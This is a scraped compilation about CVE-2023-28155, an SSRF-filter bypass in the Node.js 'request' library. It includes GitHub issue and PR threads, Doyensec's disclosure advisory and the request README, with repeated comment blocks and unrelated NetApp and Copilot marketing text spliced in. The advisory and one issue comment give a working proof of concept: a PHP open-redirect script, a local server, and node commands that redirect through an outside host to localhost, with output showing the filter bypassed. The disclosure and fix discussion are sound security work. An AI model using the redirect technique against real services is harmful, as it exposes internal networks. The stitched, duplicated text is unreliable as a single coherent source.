## Description

![@khitrenovich](https://avatars.githubusercontent.com/u/3424762?u=48ed1aa97c89d6504c9b4259abc7871b76f681e1&v=4&size=48)[khitrenovich](https://github.com/khitrenovich)opened [on Mar 23, 2023](https://github.com/cypress-io/request/issues/27#issue-1637602284)

Being a fork of the original `request` package, `@cypress/request` is vulnerable to [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6) (SSRF via insecure redirects). There is [an issue](https://github.com/request/request/pull/3442) and [an open PR](https://github.com/request/request/pull/3444) in the `request` repo, but the fix is unlikely to be merged since `request` is long abandoned. This fork is the second most popular fork, it would be great to have it patched.

## PR Checklist:

* [DONE] I have run `npm test` locally and all tests are passing.
* [DONE] I have added/updated tests for any new behavior.
* [DONE] If this is a significant change, an issue has already been created where the problem / solution was discussed: [N/A, or add link to issue here]

## PR Description

This pull request is a fix to [CVE-2023-28155.](https://github.com/request/request/issues/3442)

It introduces a new configuration option `allowInsecureRedirects`, turned off by default. The default configuration leaves library users protected from exploiting [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155"). When the option gets turned on, the cross-protocol redirects will be allowed if library user decides it's safe and required in their case.

Sorry, something went wrong.

| There were no non-doc/tools changes in the repo since 2018 and no commits at all for the last 3 years. I wouldn't expect any fix coming from here.  Our own dependency on `request` came from `jsforce` (which is [not gonna get fixed soon](https://github.com/jsforce/jsforce/issues/1312), as it looks like), so we migrated to the still-maintained [fork from Cypress](https://www.npmjs.com/package/%40cypress/request) via Yarn forced resolutions mechanism, and it worked like a charm.   ---   Update: in case somebody missed that, `request` is [deprecated since 2020](https://github.com/request/request/issues/3142). |

| I have made two PRs on cypress:   * [feat: Add allowInsecureRedirect option cypress-io/request#28](https://github.com/cypress-io/request/pull/28) : Port of this plus enabling allowRedirects in regressing tests * [security: non-breaking: Add option "allowInsecureRedirect" cypress-io/request#30](https://github.com/cypress-io/request/pull/30) : Similar but retains default behavior (non-breaking, non-safe-by-default)   It seems they have an extended test suite handling more complex redirects so if anyone feels up for extending my PRs addressing those cases to get them up to standard, feel free. |

## PR Description

This pull request is a fix to [CVE-2023-28155.](https://github.com/request/request/issues/3442)

It introduces a new configuration option `allowInsecureRedirects`, turned off by default. The default configuration leaves library users protected from exploiting [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155"). When the option gets turned on, the cross-protocol redirects will be allowed if library user decides it's safe and required in their case.

Sorry, something went wrong.

| There were no non-doc/tools changes in the repo since 2018 and no commits at all for the last 3 years. I wouldn't expect any fix coming from here.  Our own dependency on `request` came from `jsforce` (which is [not gonna get fixed soon](https://github.com/jsforce/jsforce/issues/1312), as it looks like), so we migrated to the still-maintained [fork from Cypress](https://www.npmjs.com/package/%40cypress/request) via Yarn forced resolutions mechanism, and it worked like a charm.   ---   Update: in case somebody missed that, `request` is [deprecated since 2020](https://github.com/request/request/issues/3142). |

| I have made two PRs on cypress:   * [feat: Add allowInsecureRedirect option cypress-io/request#28](https://github.com/cypress-io/request/pull/28) : Port of this plus enabling allowRedirects in regressing tests * [security: non-breaking: Add option "allowInsecureRedirect" cypress-io/request#30](https://github.com/cypress-io/request/pull/30) : Similar but retains default behavior (non-breaking, non-safe-by-default)   It seems they have an extended test suite handling more complex redirects so if anyone feels up for extending my PRs addressing those cases to get them up to standard, feel free. |

| Can we expect an updated request release with this fix soon?  If yes, how soon?  Sorry, just trying to figure out how fast we need to move out of request completely.  Thanks.  It would be great if a new version could be released including the fix. I see there was a new version a couple of days ago with the new version of xml2js so I have hope. |

| [@jeremieSTC](https://github.com/jeremieSTC) A couple of years, you mean? See above for alternatives - request itself is unmaintained and I wouldn't be hoping to see further updates. |

| Per the readme and npm deprecation warning.  As of Feb 11th 2020, request is fully deprecated. No new changes are expected to land. In fact, none have landed for some time.  Please use alternative libraries. |

## PR Checklist:

* [DONE] I have run `npm test` locally and all tests are passing.
* [DONE] I have added/updated tests for any new behavior.
* [DONE] If this is a significant change, an issue has already been created where the problem / solution was discussed: [N/A, or add link to issue here]

## PR Description

This pull request is a fix to [CVE-2023-28155.](https://github.com/request/request/issues/3442)

It introduces a new configuration option `allowInsecureRedirects`, turned off by default. The default configuration leaves library users protected from exploiting [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155"). When the option gets turned on, the cross-protocol redirects will be allowed if library user decides it's safe and required in their case.

Sorry, something went wrong.

| There were no non-doc/tools changes in the repo since 2018 and no commits at all for the last 3 years. I wouldn't expect any fix coming from here.  Our own dependency on `request` came from `jsforce` (which is [not gonna get fixed soon](https://github.com/jsforce/jsforce/issues/1312), as it looks like), so we migrated to the still-maintained [fork from Cypress](https://www.npmjs.com/package/%40cypress/request) via Yarn forced resolutions mechanism, and it worked like a charm.   ---   Update: in case somebody missed that, `request` is [deprecated since 2020](https://github.com/request/request/issues/3142). |

| I have made two PRs on cypress:   * [feat: Add allowInsecureRedirect option cypress-io/request#28](https://github.com/cypress-io/request/pull/28) : Port of this plus enabling allowRedirects in regressing tests * [security: non-breaking: Add option "allowInsecureRedirect" cypress-io/request#30](https://github.com/cypress-io/request/pull/30) : Similar but retains default behavior (non-breaking, non-safe-by-default)   It seems they have an extended test suite handling more complex redirects so if anyone feels up for extending my PRs addressing those cases to get them up to standard, feel free. |

| Can we expect an updated request release with this fix soon?  If yes, how soon?  Sorry, just trying to figure out how fast we need to move out of request completely.  Thanks.  It would be great if a new version could be released including the fix. I see there was a new version a couple of days ago with the new version of xml2js so I have hope. |

| [@jeremieSTC](https://github.com/jeremieSTC) A couple of years, you mean? See above for alternatives - request itself is unmaintained and I wouldn't be hoping to see further updates. |

| Per the readme and npm deprecation warning.  As of Feb 11th 2020, request is fully deprecated. No new changes are expected to land. In fact, none have landed for some time.  Please use alternative libraries. |

NetApp has a long-held and ongoing commitment to compliance with the ever-evolving set of global, regional, and data security and privacy standards and regulations. We uphold this commitment through self-assessments and rigorous audits by independent accredited third parties. These audits validate the adherence of our products and services to the requirements of such standards as ISO/IEC 27001, the GDPR, and the Common Criteria. These assessments help demonstrate NetApp’s integration of internationally recognized processes and best practices in our business, enabling customers to use our products and services regardless of their compliance needs.

NetApp supplies information for each compliance offering (listed at left) that includes a list of in-scope software and hardware and links to the relevant certificates and auditor’s reports.

## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.

## Description

The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).

NOTE: The `request` package is no longer supported by the maintainer.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## Security Resources

With the ever prevalent threats that span todayâs landscape, NetApp continues
to derive and provide security solutions across the portfolio. Links to
security resources are found below. As always, stay tuned because just like the
threat landscape, these resources are ever changing and being updated!

#### Products and Solutions

The product and solutions resources provide guidance, recommendations, and best
practices with regard to security elements and configurations amongst the
NetApp portfolio.

##### ONTAP

[ONTAP 9 Security Datasheet](http://www.netapp.com/us/media/ds-3846.pdf) - The
ONTAP 9 Security Datasheet provides a comprehensive list of security features
and functions available in ONTAP 9 - So if the question is, âwhat are all the
security features/functions in ONTAP 9?â, This is your resource!

[Security Hardening Guide for NetApp ONTAP
9](https://www.netapp.com/us/media/tr-4569.pdf) - We humbly refer to the
Security Hardening Guide for NetApp ONTAP 9 as your key resource when it comes
to answering the question, âhow do I deploy ONTAP 9 in the most secure
fashion?â. The hardening guide provides the recommended commands and configs
necessary to enable ONTAP 9 in the most secure configuration.

[ONTAP 9 Encryption Power
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Security_and_data_encryption.pdf)

* When it comes to understanding the configuration and management details of NSE and NVE,
  including deployment, certificates, onboard key management and more, the Power
  Guide is the key resource!

[ONTAP 9 Network Management
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Network_management.pdf) - While
this guide provides vast elements surrounding ONTAP networking (IPv4, v6,
IPSpaces, and more), it also captures some key security elements such as
managing SVMs, protocol restrictions and firewall configuration in addition to
control plane elements such as DNS, SNMP, FIPS configuration, and MTU details.
The Network Management Guide also shows list of ports used in ONTAP, also
listed in the hardening guide.

[ONTAP 9 Manage administrator authentication and RBAC with the
CLI](https://docs.netapp.com/us-en/ontap/authentication/)

* You can enable login accounts for ONTAP cluster administrators and storage virtual machine (SVM) administrators.
  You can also use role-based access control (RBAC) to define the capabilities of administrators.

[NFS Kerberos in ONTAP](https://www.netapp.com/pdf.html?item=/media/19384-tr-4616.pdf)

* How to configure NFS Kerberos support in ONTAP for Active Directory and Red Hat Enterprise Linux (RHEL) clients.

[How to configure LDAP in ONTAP Multiprotocol NAS identity
management](https://www.netapp.com/pdf.html?item=/media/19423-tr-4835.pdf)

* Lightweight Directory Access Protocol (LDAP) configuration as a method for UNIX identity
  management and name mapping for multiprotocol NAS access in ONTAP.

[DS-3898: NetApp Storage Encryption and NetApp Volume
Encryption](http://www.netapp.com/us/media/ds-3898.pdf) - When it comes to
encryption at rest there are many questions about the capabilities. The NSE and
NVE Datasheet seeks to quell such questions by providing a comprehensive
understanding of what NSE is, what NVE is, use cases, and how they can be
leveraged individually or together for a true dual/double encryption solution.

[NetApp Storage Encryption
Datasheet](http://www.netapp.com/us/media/ds-3213-en.pdf) - The NSE Datasheet
provides a holistic overview of the NSE solution and use cases. If you have
ever wondered what NSE is, what we mean by self encrypting drives, or what
encryption algorithm is in use, this is the resource for you!

[NetApp Volume Encryption
Datasheet](http://www.netapp.com/us/media/ds-3899.pdf) - The NVE Datasheet
provides a holistic overview of the NVE solution and use cases. If you have
ever wondered what NVE is, or what encryption algorithm it uses, this is the
resource for you!

#### Threats

Threat resources consist of guidance to address known threats through a
combination of prevention, mitigation, and remediation.

##### Ransomware

[The NetApp Solution for
Ransomware](http://www.netapp.com/us/media/tr-4572.pdf) - Ransomware wages war
on every environment. Being the custodians of one of the worldâs most valuable
resources (data/information), itâs imperative that we protect it. When it comes
to ransomware, this is your guide to addressing and remediating the threat.

[NetApp and Varonis ransomware white

As a companion to the NetApp Solution for Ransomware, we have partnered with
Varonis in addressing the advanced techniques around this threat. We have
discussed and captured the solution in this joint white paper.

#### Integration and Solutions Guides

As we continue to tout the key elements of security including key management,
we understand the challenges and value of timeliness as it applies to adoption
and deployment. Due to such challenges we provide integration guides where we
walk through the configuration/provisioning of âkeyâ elements such as key
managers, FPolicy, and other security laden integration solutions.

##### Key Management

[NetApp ONTAP 9 External Key Management: Vormetric Key Management Integration
Guide](http://www.netapp.com/us/media/tr-4618.pdf) - The Vormetric integration
guide for ONTAP 9 depicts how to provision the Vormetric (Thales) key manager

| Summary I am a security researcher at [Doyensec](https://doyensec.com/).  During a security engagement I have identified a security vulnerability in the Request library. In a spirit of a Responsible Disclosure we have tried to contact the maintainer directly on 12/02/2022 and 01/18/2023 via [email](mikeal.rogers%40gmail.com), but we have received no answer.  Please provide a communication channel that would allow us to share the technical details and the proposed fix, otherwise we will be forced to disclose the vulnerability publicly.  You can contact me via email: szymon@doyensec.com |

### **[SzymonDrosdzol](/SzymonDrosdzol)** commented [Mar 16, 2023](#issuecomment-1471912620)

| Summary A Server Side Request Forgery (SSRF) attack describes the ability of an attacker to create network connections from a vulnerable web application to the internal network and other Internet hosts. Frequently, a SSRF vulnerability is used to attack internal services placed behind a firewall and not directly accessible from the Internet.  The Request library can be leveraged to initiate an HTTP / HTTPS connection and potentially gather information about the victim's internal infrastructure even if there's anti-SSRF filtering in place.  The issue has been assigned with a [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155") identification number. Technical Description In JavaScript HTTP clients the SSRF filters utilize the HTTP(S) agents to hook to the `onConnect` event to filter the target hosts before the communication starts. In case of a redirect with a protocol switch (eg. HTTP redirecting to HTTPS) the library deletes the agent, all event listeners and SSRF protection in the process. This behavior can be observed in the `lib/redirect.js`:  ``` // handle the case where we change protocol from https to http or vice versa if (request.uri.protocol !== uriPrev.protocol) {   delete request.agent } ``` Reproduction Steps The issue can be demonstrated using the following steps:   1. Prepare an attacker-controlled server with the ability to redirect to arbitrary URLs. Example PHP script:  ``` <?php  header('Location: '.$_GET["target"]); ?> ```  2. Set up a local HTTP server.  ``` $ python3 -m http.server 80 ```  3. Prepare a test script with anti-SSRF protection plugged into request library:  ``` const request = require('request'); const ssrfFilter = require('ssrf-req-filter');  let url = process.argv[2]; console.log("Testing", url);  request({     uri: url,     agent: ssrfFilter(url), });  console.log("OK"); ```  4. For the sake of an example, I have placed the redirect script on my server `tellico.fun`. 5. Verify that in case of a redirect without protocol switch the SSRF attempt is blocked:  ``` $ node dev/request.js "https://tellico.fun/redirect.php?target=https://localhost/test" Testing https://tellico.fun/redirect.php?target=https://localhost/test events.js:353       throw er; // Unhandled 'error' event       ^  Error: Call to 127.0.0.1 is blocked. ```  6. Verify that in case of cross-protocol redirect the SSRF is still possible (also the local HTTP server logs should show the incoming request):  ``` $ node dev/request.js "https://tellico.fun/redirect.php?target=http://localhost/test" Testing https://tellico.fun/redirect.php?target=http://localhost/test OK ``` |

| I imagine this is where the problem lies?: <https://github.com/request/request/blame/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/lib/redirect.js#L111>  I'm having a hard time deciding if this should be considered a requestjs "vuln" or if its more of a "bug". It looks like requestjs was always vulnerable to SSRFs, and `ssrf-req-filter` is what fixed the problem. But given how requestjs is written, this bug is the way to bypass `ssrf-req-filter`.  Either way, it looks unfixable without editing requestjs's source.  And given that requestjs has been deprecated for years, my guess is this won't be fixed. So wouldnt this mean its now time to move to other libraries? At least for companies that need to keep their `npm audit`s "up to code" |

| Tangential call for help, and question addressed to subscribers of this issue: is it clear to you how to get SSRF protection in recently-introdued-in-node18 `fetch` like we do in axios/request with a plugin like ssrf-req-filter? (Putting this CVE aside, of course).  It's not to me. Community implementation `node-fetch` has support for something similar, but I can't find anything in the new implementation maintained by nodejs based on undici. I created [nodejs/undici#2019](https://github.com/nodejs/undici/issues/2019) with details, any clues welcome there.  **END Tangential call for help, sorry for the mild noise, please comment about SSRF-in-native-node-fetch at [nodejs/undici#2019](https://github.com/nodejs/undici/issues/2019) , not here.** |

| Hi [@KernowSec](https://github.com/KernowSec)  It seems that the `request-promise` is a simple wrapper around the original `request` library, so I would expect it to be just as vulnerable. Reproduction will be probably very similar to the original too.  The `request-promise` is also considered deprecated, so the best recommendation is to plan the migration to other libraries. |

Security Advisory

Overview

This document summarizes the results of a vulnerability research activity in the Request library (https://
www.npmjs.com/package/request) used by one of our clients as a third party dependency.

While security testing was not meant to be comprehensive in term of attack and code coverage, we have
identiﬁed a vulnerability that could lead to Server Side Request Forgery attacks, even when the anti SSRF
protection is in place.

About Us

Doyensec  is  an  independent  security  research  and  development  company  focused  on  vulnerability
discovery  and  remediation.  We  work  at  the  intersection  of  software  development  and  offensive
engineering to help companies craft secure code.

Research is one of our founding principles and we invest heavily in it. By discovering new vulnerabilities
and attack techniques, we constantly improve our capabilities and contribute to secure the applications
we all use.

CVE-2023-28155

Szymon Drosdzol

A  Server  Side  Request  Forgery  (SSRF)  attack  describes  the  ability  of  an  attacker  to  create  network
connections  from  a  vulnerable  web  application  to  the  internal  network  and  other  Internet  hosts.
Frequently, a SSRF vulnerability is used to attack internal services placed behind a ﬁrewall and not directly
accessible from the Internet.

NPM’s Request library can be leveraged to initiate an HTTP / HTTPS connection. Even when conﬁgured
with  anti-SSRF  protections,  this  library  allows  access  to  restricted  hosts  via  a  cross-protocol  redirect
bypass vulnerability.

Technical Description

Commonly,  SSRF  ﬁlters  for  JavaScript  HTTP  clients  utilize  the  HTTP(S)  agents  to  hook  the  onConnect
event and ﬁlter the target hosts before the communication has been initialized. In the case of a redirect
with  a  protocol  switch  (eg.  HTTP  redirecting  to  HTTPS  or  vice  versa),  the  request  library  deletes  all
conﬁgured agents. As a result, all event listeners and anti-SSRF mechanisms are also voided.

This behavior can be observed in the ﬁle lib/redirect.js:

// handle the case where we change protocol from https to http or vice versa
if (request.uri.protocol !== uriPrev.protocol) {
  delete request.agent
}

Reproduction Steps

The issue can be demonstrated using the following steps:

1. Prepare an attacker-controlled server with the ability to redirect to arbitrary URLs. Example PHP script:

<?php  header('Location: '.$_GET["target"]); ?>

Security Advisory

2. Set up a local HTTP server.

$ python3 -m http.server 80

3. Prepare a test script with anti-SSRF protection plugged into request library:

const request = require('request');
const ssrfFilter = require('ssrf-req-filter');

let url = process.argv[2];
console.log("Testing", url);

request({
    uri: url,
    agent: ssrfFilter(url),
});

console.log("OK");

4. For  the  sake  of  this  example,  we  have  placed  the  redirect  script  on  tellico.fun.  Verify  that  in  the

case of a redirect without protocol switch, the SSRF attempt is blocked:

$  node  dev/request.js  "https://tellico.fun/redirect.php?target=https://
localhost/test"
Testing https://tellico.fun/redirect.php?target=https://localhost/test
events.js:353
      throw er; // Unhandled 'error' event
      ^

Error: Call to 127.0.0.1 is blocked.

5. Verify that in the case of cross-protocol redirect, the SSRF is still possible:

$  node  dev/request.js  "https://tellico.fun/redirect.php?target=http://localhost/
test"
Testing https://tellico.fun/redirect.php?target=http://localhost/test
OK

Remediation

Despite the fact that the request library has been deprecated, this dependency is still used by over 50k
projects with over 18M downloads per week.

The maintainer did not reply to our advisory, so there is not an ofﬁcial release that would ﬁx this issue (at
the time of publication of this document). Doyensec has proposed a potential ﬁx in https://github.com/
request/request/pull/3444.

# Deprecated!

As of Feb 11th 2020, request is fully deprecated. No new changes are expected to land. In fact, none have landed for some time.

For more information about why request is deprecated and possible alternatives refer to
[this issue](https://github.com/request/request/issues/3142).

## Super simple to use

Request is designed to be the simplest way possible to make http calls. It supports HTTPS and follows redirects by default.

```
const request = require('request');
request('http://www.google.com', function (error, response, body) {
  console.error('error:', error); // Print the error if one occurred
  console.log('statusCode:', response && response.statusCode); // Print the response status code if a response was received
  console.log('body:', body); // Print the HTML for the Google homepage.
});
```

Request also offers [convenience methods](#convenience-methods) like
`request.defaults` and `request.post`, and there are
lots of [usage examples](#examples) and several
[debugging techniques](#debugging).

---

## Streaming

You can stream any response to a file stream.

```
request('http://google.com/doodle.png').pipe(fs.createWriteStream('doodle.png'))
```

You can also stream a file to a PUT or POST request. This method will also check the file extension against a mapping of file extensions to content-types (in this case `application/json`) and use the proper `content-type` in the PUT request (if the headers don’t already provide one).

```
fs.createReadStream('file.json').pipe(request.put('http://mysite.com/obj.json'))
```

Request can also `pipe` to itself. When doing so, `content-type` and `content-length` are preserved in the PUT headers.

```
request.get('http://google.com/img.png').pipe(request.put('http://mysite.com/img.png'))
```

Request emits a "response" event when a response is received. The `response` argument will be an instance of [http.IncomingMessage](https://nodejs.org/api/http.html#http_class_http_incomingmessage).

```
request
  .get('http://google.com/img.png')
  .on('response', function(response) {
    console.log(response.statusCode) // 200
    console.log(response.headers['content-type']) // 'image/png'
  })
  .pipe(request.put('http://mysite.com/img.png'))
```

To easily handle errors when streaming requests, listen to the `error` event before piping:

```
request
  .get('http://mysite.com/doodle.png')
  .on('error', function(err) {
    console.error(err)
  })
  .pipe(fs.createWriteStream('doodle.png'))
```

Now let’s get fancy.

```
http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    if (req.method === 'PUT') {
      req.pipe(request.put('http://mysite.com/doodle.png'))
    } else if (req.method === 'GET' || req.method === 'HEAD') {
      request.get('http://mysite.com/doodle.png').pipe(resp)
    }
  }
})
```

You can also `pipe()` from `http.ServerRequest` instances, as well as to `http.ServerResponse` instances. The HTTP method, headers, and entity-body data will be sent. Which means that, if you don't really care about security, you can do:

```
http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    const x = request('http://mysite.com/doodle.png')
    req.pipe(x)
    x.pipe(resp)
  }
})
```

And since `pipe()` returns the destination stream in ≥ Node 0.5.x you can do one line proxying. :)

```
req.pipe(request('http://mysite.com/doodle.png')).pipe(resp)
```

Also, none of this new functionality conflicts with requests previous features, it just expands them.

```
const r = request.defaults({'proxy':'http://localproxy.com'})

http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    r.get('http://google.com/doodle.png').pipe(resp)
  }
})
```

You can still use intermediate proxies, the requests will still follow HTTP forwards, etc.

## Promises & Async/Await

`request` supports both streaming and callback interfaces natively. If you'd like `request` to return a Promise instead, you can use an alternative interface wrapper for `request`. These wrappers can be useful if you prefer to work with Promises, or if you'd like to use `async`/`await` in ES2017.

Several alternative interfaces are provided by the request team, including:

* [`request-promise`](https://github.com/request/request-promise) (uses [Bluebird](https://github.com/petkaantonov/bluebird) Promises)
* [`request-promise-native`](https://github.com/request/request-promise-native) (uses native Promises)
* [`request-promise-any`](https://github.com/request/request-promise-any) (uses [any-promise](https://www.npmjs.com/package/any-promise) Promises)

Also, [`util.promisify`](https://nodejs.org/api/util.html#util_util_promisify_original), which is available from Node.js v8.0 can be used to convert a regular function that takes a callback to return a promise instead.

[back to top](#table-of-contents)

---

## Forms

`request` supports `application/x-www-form-urlencoded` and `multipart/form-data` form uploads. For `multipart/related` refer to the `multipart` API.

#### application/x-www-form-urlencoded (URL-Encoded Forms)

URL-encoded forms are simple.

```
request.post('http://service.com/upload', {form:{key:'value'}})
// or
request.post('http://service.com/upload').form({key:'value'})
// or
request.post({url:'http://service.com/upload', form: {key:'value'}}, function(err,httpResponse,body){ /* ... */ })
```

#### multipart/form-data (Multipart Form Uploads)

For `multipart/form-data` we use the [form-data](https://github.com/form-data/form-data) library by [@felixge](https://github.com/felixge). For the most cases, you can pass your upload form data via the `formData` option.

```
const formData = {
  // Pass a simple key-value pair
  my_field: 'my_value',
  // Pass data via Buffers
  my_buffer: Buffer.from([1, 2, 3]),
  // Pass data via Streams
  my_file: fs.createReadStream(__dirname + '/unicycle.jpg'),
  // Pass multiple values /w an Array
  attachments: [
    fs.createReadStream(__dirname + '/attachment1.jpg'),
    fs.createReadStream(__dirname + '/attachment2.jpg')
  ],
  // Pass optional meta-data with an 'options' object with style: {value: DATA, options: OPTIONS}
  // Use case: for some types of streams, you'll need to provide "file"-related information manually.
  // See the `form-data` README for more information about options: https://github.com/form-data/form-data
  custom_file: {
    value:  fs.createReadStream('/dev/urandom'),
    options: {
      filename: 'topsecret.jpg',
      contentType: 'image/jpeg'
    }
  }
};
request.post({url:'http://service.com/upload', formData: formData}, function optionalCallback(err, httpResponse, body) {
  if (err) {
    return console.error('upload failed:', err);
  }
  console.log('Upload successful!  Server responded with:', body);
});
```

For advanced cases, you can access the form-data object itself via `r.form()`. This can be modified until the request is fired on the next cycle of the event-loop. (Note that this calling `form()` will clear the currently set form data for that request.)

```
// NOTE: Advanced use-case, for normal use see 'formData' usage above
const r = request.post('http://service.com/upload', function optionalCallback(err, httpResponse, body) {...})
const form = r.form();
form.append('my_field', 'my_value');
form.append('my_buffer', Buffer.from([1, 2, 3]));
form.append('custom_file', fs.createReadStream(__dirname + '/unicycle.jpg'), {filename: 'unicycle.jpg'});
```

See the [form-data README](https://github.com/form-data/form-data) for more information & examples.

#### multipart/related

Some variations in different HTTP implementations require a newline/CRLF before, after, or both before and after the boundary of a `multipart/related` request (using the multipart option). This has been observed in the .NET WebAPI version 4.0. You can turn on a boundary preambleCRLF or postamble by passing them as `true` to your request options.

```
  request({
    method: 'PUT',
    preambleCRLF: true,
    postambleCRLF: true,
    uri: 'http://service.com/upload',
    multipart: [
      {
        'content-type': 'application/json',
        body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
      },
      { body: 'I am an attachment' },
      { body: fs.createReadStream('image.png') }
    ],
    // alternatively pass an object containing additional options
    multipart: {
      chunked: false,
      data: [
        {
          'content-type': 'application/json',
          body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
        },
        { body: 'I am an attachment' }
      ]
    }
  },
  function (error, response, body) {
    if (error) {
      return console.error('upload failed:', error);
    }
    console.log('Upload successful!  Server responded with:', body);
  })
```

[back to top](#table-of-contents)

## HTTP Authentication

```
request.get('http://some.server.com/').auth('username', 'password', false);
// or
request.get('http://some.server.com/', {
  'auth': {
    'user': 'username',
    'pass': 'password',
    'sendImmediately': false
  }
});
// or
request.get('http://some.server.com/').auth(null, null, true, 'bearerToken');
// or
request.get('http://some.server.com/', {
  'auth': {
    'bearer': 'bearerToken'
  }
});
```

If passed as an option, `auth` should be a hash containing values:

* `user` || `username`
* `pass` || `password`
* `sendImmediately` (optional)
* `bearer` (optional)

The method form takes parameters
`auth(username, password, sendImmediately, bearer)`.

`sendImmediately` defaults to `true`, which causes a basic or bearer
authentication header to be sent. If `sendImmediately` is `false`, then
`request` will retry with a proper authentication header after receiving a
`401` response from the server (which must contain a `WWW-Authenticate` header
indicating the required authentication method).

Note that you can also specify basic authentication using the URL itself, as
detailed in [RFC 1738](http://www.ietf.org/rfc/rfc1738.txt). Simply pass the
`user:password` before the host with an `@` sign:

```
const username = 'username',
    password = 'password',
    url = 'http://' + username + ':' + password + '@some.server.com';

request({url}, function (error, response, body) {
   // Do more stuff with 'body' here
});
```

Digest authentication is supported, but it only works with `sendImmediately`
set to `false`; otherwise `request` will send basic authentication on the
initial request, which will probably cause the request to fail.

Bearer authentication is supported, and is activated when the `bearer` value is
available. The value may be either a `String` or a `Function` returning a
`String`. Using a function to supply the bearer token is particularly useful if
used in conjunction with `defaults` to allow a single function to supply the
last known token at the time of sending a request, or to compute one on the fly.

## Custom HTTP Headers

HTTP Headers, such as `User-Agent`, can be set in the `options` object.
In the example below, we call the github API to find out the number
of stars and forks for the request repository. This requires a
custom `User-Agent` header as well as https.

```
const request = require('request');

const options = {
  url: 'https://api.github.com/repos/request/request',
  headers: {
    'User-Agent': 'request'
  }
};

function callback(error, response, body) {
  if (!error && response.statusCode == 200) {
    const info = JSON.parse(body);
    console.log(info.stargazers_count + " Stars");
    console.log(info.forks_count + " Forks");
  }
}

request(options, callback);
```

## OAuth Signing

[OAuth version 1.0](https://tools.ietf.org/html/rfc5849) is supported. The
default signing algorithm is
[HMAC-SHA1](https://tools.ietf.org/html/rfc5849#section-3.4.2):

```
// OAuth1.0 - 3-legged server side flow (Twitter example)
// step 1
const qs = require('querystring')
  , oauth =
    { callback: 'http://mysite.com/callback/'
    , consumer_key: CONSUMER_KEY
    , consumer_secret: CONSUMER_SECRET
    }
  , url = 'https://api.twitter.com/oauth/request_token'
  ;
request.post({url:url, oauth:oauth}, function (e, r, body) {
  // Ideally, you would take the body in the response
  // and construct a URL that a user clicks on (like a sign in button).
  // The verifier is only available in the response after a user has
  // verified with twitter that they are authorizing your app.

  // step 2
  const req_data = qs.parse(body)
  const uri = 'https://api.twitter.com/oauth/authenticate'
    + '?' + qs.stringify({oauth_token: req_data.oauth_token})
  // redirect the user to the authorize uri

  // step 3
  // after the user is redirected back to your server
  const auth_data = qs.parse(body)
    , oauth =
      { consumer_key: CONSUMER_KEY
      , consumer_secret: CONSUMER_SECRET
      , token: auth_data.oauth_token
      , token_secret: req_data.oauth_token_secret
      , verifier: auth_data.oauth_verifier
      }
    , url = 'https://api.twitter.com/oauth/access_token'
    ;
  request.post({url:url, oauth:oauth}, function (e, r, body) {
    // ready to make signed requests on behalf of the user
    const perm_data = qs.parse(body)
      , oauth =
        { consumer_key: CONSUMER_KEY
        , consumer_secret: CONSUMER_SECRET
        , token: perm_data.oauth_token
        , token_secret: perm_data.oauth_token_secret
        }
      , url = 'https://api.twitter.com/1.1/users/show.json'
      , qs =
        { screen_name: perm_data.screen_name
        , user_id: perm_data.user_id
        }
      ;
    request.get({url:url, oauth:oauth, qs:qs, json:true}, function (e, r, user) {
      console.log(user)
    })
  })
})
```

For [RSA-SHA1 signing](https://tools.ietf.org/html/rfc5849#section-3.4.3), make
the following changes to the OAuth options object:

* Pass `signature_method : 'RSA-SHA1'`
* Instead of `consumer_secret`, specify a `private_key` string in
  [PEM format](http://how2ssl.com/articles/working_with_pem_files/)

For [PLAINTEXT signing](http://oauth.net/core/1.0/#anchor22), make
the following changes to the OAuth options object:

* Pass `signature_method : 'PLAINTEXT'`

To send OAuth parameters via query params or in a post body as described in The
[Consumer Request Parameters](http://oauth.net/core/1.0/#consumer_req_param)
section of the oauth1 spec:

* Pass `transport_method : 'query'` or `transport_method : 'body'` in the OAuth
  options object.
* `transport_method` defaults to `'header'`

To use [Request Body Hash](https://oauth.googlecode.com/svn/spec/ext/body_hash/1.0/oauth-bodyhash.html) you can either

* Manually generate the body hash and pass it as a string `body_hash: '...'`
* Automatically generate the body hash by passing `body_hash: true`

## Proxies

If you specify a `proxy` option, then the request (and any subsequent
redirects) will be sent via a connection to the proxy server.

If your endpoint is an `https` url, and you are using a proxy, then
request will send a `CONNECT` request to the proxy server *first*, and
then use the supplied connection to connect to the endpoint.

That is, first it will make a request like:

```
